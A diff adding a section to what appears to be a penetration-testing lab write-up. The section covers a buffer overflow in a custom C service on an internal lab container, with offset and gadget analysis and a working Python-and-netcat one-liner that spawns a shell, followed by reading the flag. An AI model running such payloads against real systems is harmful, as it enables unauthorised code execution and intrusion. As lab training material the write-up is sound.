@@ -466,6 +466,41 @@ Since we have root access on the main container, we can also try to access the i
 
 #### FLAG PIVOT: PIVOTING{b036ea40f13e3287b8e8babd5749e7cf}
 
+## Internal Service Exploitation: mbptl-internal (Buffer Overflow)
+
+After pivoting to the internal network, we discovered a service running on port 31337 inside the `mbptl-internal` container. This service is a custom C binary (`main`).
+
+### Vulnerability Analysis
+- The program uses `gets()` to read user input into a 128-byte buffer, making it vulnerable to a classic buffer overflow.
+- There is a hidden function `__secret()` that spawns a shell with `system("/bin/bash")`.
+- The binary is compiled with `-no-pie` and without stack protections, making it straightforward to exploit.
+
+### Exploitation Steps
+1. **Identify the Offset:**
+   - The buffer is 128 bytes, plus 8 bytes for saved RBP, so the return address is at offset 136.
+2. **Find Gadgets:**
+   - The goal is to redirect execution to `__secret`. However, if stack alignment is required, a `ret` gadget may be needed.
+   - In this case, the payload uses two addresses: a `ret` gadget at `0x401282` and the `__secret` function at `0x4011b6`.
+3. **Craft the Payload:**
+   - The payload consists of 136 bytes of padding, followed by the address of the `ret` gadget, then the address of `__secret`.
+
+#### Exploit Payload
+```bash
+(python3 -c 'import struct, sys; sys.stdout.buffer.write(b"A"*136 + struct.pack("<Q", 0x401282) + struct.pack("<Q", 0x4011b6))'; cat -) | nc mbptl-internal 31337
+```
+- This command sends the overflow payload to the service, spawning a shell.
+
+#### Reading the Flag
+Once the shell is obtained, simply read the flag:
+```bash
+cat /flag.txt
+```
+
+**Flag:**
+```
+FLAG{c7e0cb7880fd168f41f25e24767660f6}
+```
+
 ## Conclusion
 
 This lab demonstrates a complete penetration testing methodology covering:
@@ -490,6 +525,8 @@ The lab showcases common web application vulnerabilities and demonstrates how th
 - **Nmap:** Port scanning and service enumeration
 - **Dirsearch:** Directory and file enumeration
 - **SQLMap:** Automated SQL injection exploitation
-- **Netcat:** Reverse shell establishment
+- **Netcat:** Reverse shell establishment and binary exploitation
 - **LinPEAS:** Privilege escalation enumeration
 - **Curl:** HTTP request testing and exploitation
+- **Python3:** Buffer overflow payload creation
+- **Struct module:** Binary data packing for exploit development
